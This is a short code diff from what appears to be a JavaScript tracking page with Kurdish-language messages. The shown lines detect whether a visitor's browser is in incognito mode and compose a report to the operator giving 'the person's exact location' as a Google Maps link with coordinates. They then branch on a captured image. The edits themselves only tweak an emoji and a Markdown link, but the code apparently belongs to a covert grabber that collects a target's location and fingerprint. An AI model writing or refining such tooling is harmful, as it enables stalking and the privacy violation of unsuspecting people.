@@ -198,7 +198,7 @@
                 if ('storage' in navigator && 'estimate' in navigator.storage) {
                     let estimate = await navigator.storage.estimate();
                     if (estimate.quota && estimate.quota < 120 * 1024 * 1024) {
-                        incognitoStatus = "پەنجەرەی نەبینراو / ئینکۆگنیستۆ (Incognito Mode) 🕵️‍♂️";
+                        incognitoStatus = "پەنجەرەی نەبینراو / ئینکۆگنیستۆ (Incognito Mode) 🕵️‍♂️️";
                     }
                 }
             } catch (e) {}
@@ -230,7 +230,7 @@
             }
 
             let mapTextPart = mapLink 
-                ? `لۆکەیشنی دەقیقی کەسەکە ئەمەتا دەتوانی بە کلیک کردن لەسەر [گووگڵ ماپ] (${mapLink}) بیبینی:\n(Lat & Long: ${locationText})` 
+                ? `لۆکەیشنی دەقیقی کەسەکە ئەمەتا دەتوانی بە کلیک کردن لەسەر [گووگڵ ماپ](${mapLink}) بیبینی:\n(Lat & Long: ${locationText})` 
                 : `لۆکەیشن: ${locationStatus}`;
 
             let introText = imageBlob 
